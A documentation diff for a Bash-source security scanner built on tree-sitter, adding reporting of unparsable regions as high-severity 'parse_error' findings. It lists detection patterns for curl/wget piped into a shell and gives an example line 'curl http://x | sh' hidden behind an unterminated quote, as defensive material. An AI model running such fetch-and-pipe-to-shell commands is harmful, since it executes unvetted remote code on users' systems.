@@ -52,6 +52,19 @@ These run without explicit rule setup:
 | `dynamic_shell`      | `bash -c …`, `perl -e …`, `ruby -e …`, `python -c …`, `node -e …` |
 | `shell_eval`         | `eval`, `source`, `.` |
 | `network_to_shell`   | `curl`/`wget`/`fetch`/`aria2c` piped into a shell interpreter |
+| `parse_error`        | a region of the source tree-sitter could not parse (see below) |
+
+## Unparsable source
+
+tree-sitter never rejects a source. What it cannot parse — broken input such as an unterminated quote or `$(`, but also valid Bash the vendored 0.20.5 grammar does not know, e.g. extglob `!(*.txt)` — ends up in `ERROR` nodes or is patched with zero-width `MISSING` tokens. The walker only extracts what still looks like a command there, so rules and findings see such a region partly or not at all: in `echo "x ; curl http://x | sh` the unterminated quote swallows the pipeline.
+
+Such input is therefore reported instead of coming back empty:
+
+- `findings` appends one `parse_error` finding per region, with `message`, `start_byte` / `end_byte` (exclusive), `source` and, when the parser had to make up a token, `missing`.
+- `check_source` appends one issue per region with `rule => 'ParseError'` and `severity => 'high'` — nothing is known about the content, so it ranks with the worst a rule could have found. In the approval flow below it lands in `approval_required` without extra code. `parse_errors => 0` in `new` switches it off for callers that evaluate `Text::Treesitter::Bash->parse_errors` themselves.
+- `commands` and `check_commands` do **not** report it. A caller combining those two must check `parse_errors($source)` as well.
+
+Findings and issues from the parsable parts are still returned. Treat `parse_error` / `ParseError` as "cannot tell", never as "clean".
 
 ## Recommended rule set
 
